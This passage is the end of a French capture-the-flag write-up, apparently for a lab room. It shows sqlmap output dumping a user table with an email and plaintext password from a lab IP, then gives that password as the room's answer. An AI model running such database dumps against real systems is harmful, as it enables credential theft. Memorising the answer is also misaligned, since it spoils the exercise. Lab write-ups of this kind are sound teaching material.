[1 entry]
+------+-----------------+---------------------+------------+
| id   | email           | created             | password   |
+------+-----------------+---------------------+------------+
| 1    | test@chatai.com | 2023-02-21 09:05:46 | 12345678   |
+------+-----------------+---------------------+------------+

[15:02:17] [INFO] table 'ai.`user`' dumped to CSV file '/root/.sqlmap/output/10.10.111.207/dump/ai/user.csv'
[15:02:17] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.111.207'
[15:02:17] [WARNING] you haven't updated sqlmap for more than 2031 days!!!

[*] ending @ 15:02:17 /2025-10-25/
```

Et boom on a le mot de passe de l'email

**Réponse :** `12345678`

**Room Complétée**

{% include comments.html %}